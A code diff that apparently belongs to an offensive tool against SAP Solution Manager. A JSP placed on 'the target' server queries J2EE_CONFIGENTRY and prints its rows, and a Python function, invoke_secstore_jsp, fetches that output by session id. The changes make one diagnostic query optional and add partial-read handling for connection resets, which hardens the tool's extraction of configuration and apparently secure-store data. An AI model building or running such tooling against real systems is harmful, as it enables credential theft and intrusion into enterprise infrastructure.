@@ -314,34 +314,35 @@ try {
                 rs2.close(); ps2.close();
                 out.println("# context_rows=" + ctxCount);
 
-                // Diagnostic — scan the WHOLE J2EE_CONFIGENTRY table
-                // for ANY row whose name contains 'URL' / 'http' /
-                // 'Address' (case-insensitive).  Tells us whether
-                // HTTP destinations are stored in this table at all
-                // on the target.  On older SolMan 7.00 they often
-                // live in entirely separate tables; this surfaces
-                // that fact definitively.
-                try {
-                    java.sql.PreparedStatement ps3 = conn.prepareStatement(
-                        "SELECT NAME, COUNT(*) AS C "
-                        + "FROM J2EE_CONFIGENTRY "
-                        + "WHERE UPPER(NAME) LIKE '%URL%' "
-                        + "   OR UPPER(NAME) LIKE '%HTTP%' "
-                        + "   OR UPPER(NAME) LIKE '%ADDRESS%' "
-                        + "GROUP BY NAME "
-                        + "ORDER BY C DESC");
-                    java.sql.ResultSet rs3 = ps3.executeQuery();
-                    int rows3 = 0;
-                    while (rs3.next() && rows3 < 25) {
-                        out.println("HTTPDIAG " + rs3.getString("NAME")
-                            + "=" + rs3.getInt("C"));
-                        rows3++;
+                // Optional diagnostic — scan J2EE_CONFIGENTRY for names
+                // containing URL / HTTP / Address.  Opt-in only via
+                // include_httpdiag=1 because on SolMan 7.00 the table
+                // is unindexed on NAME + huge, so UPPER(NAME) LIKE
+                // '%URL%' blocks for minutes and ICM RSTs the request
+                // before we ever see the response body.
+                if ("1".equals(request.getParameter("include_httpdiag"))) {
+                    try {
+                        java.sql.PreparedStatement ps3 = conn.prepareStatement(
+                            "SELECT NAME, COUNT(*) AS C "
+                            + "FROM J2EE_CONFIGENTRY "
+                            + "WHERE UPPER(NAME) LIKE '%URL%' "
+                            + "   OR UPPER(NAME) LIKE '%HTTP%' "
+                            + "   OR UPPER(NAME) LIKE '%ADDRESS%' "
+                            + "GROUP BY NAME "
+                            + "ORDER BY C DESC");
+                        java.sql.ResultSet rs3 = ps3.executeQuery();
+                        int rows3 = 0;
+                        while (rs3.next() && rows3 < 25) {
+                            out.println("HTTPDIAG " + rs3.getString("NAME")
+                                + "=" + rs3.getInt("C"));
+                            rows3++;
+                        }
+                        out.println("# httpdiag_rows=" + rows3);
+                        rs3.close(); ps3.close();
+                    } catch (Throwable hd) {
+                        out.println("# httpdiag_error="
+                            + hd.getClass().getSimpleName());
                     }
-                    out.println("# httpdiag_rows=" + rows3);
-                    rs3.close(); ps3.close();
-                } catch (Throwable hd) {
-                    out.println("# httpdiag_error="
-                        + hd.getClass().getSimpleName());
                 }
             }
         } catch (Throwable cet) {
@@ -410,7 +411,20 @@ def invoke_secstore_jsp(jsp_url: str, sid: str,
               "jdbc_meta": {}, "error": "", "raw": ""}
     try:
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
-            text = r.read().decode("latin1", errors="replace")
+            # Incremental read — if the server mid-body RSTs (common on
+            # old ICMs when an inner SQL stalls past the engine timeout),
+            # we still want the bytes that did arrive so CONFIG_ENTRIES
+            # up to that point stays usable.
+            chunks = []
+            try:
+                while True:
+                    b = r.read(16384)
+                    if not b:
+                        break
+                    chunks.append(b)
+            except (TimeoutError, OSError) as e:
+                result["error"] = f"partial read: {e}"
+            text = b"".join(chunks).decode("latin1", errors="replace")
     except urllib.error.HTTPError as e:
         try:
             text = e.read().decode("latin1", errors="replace")
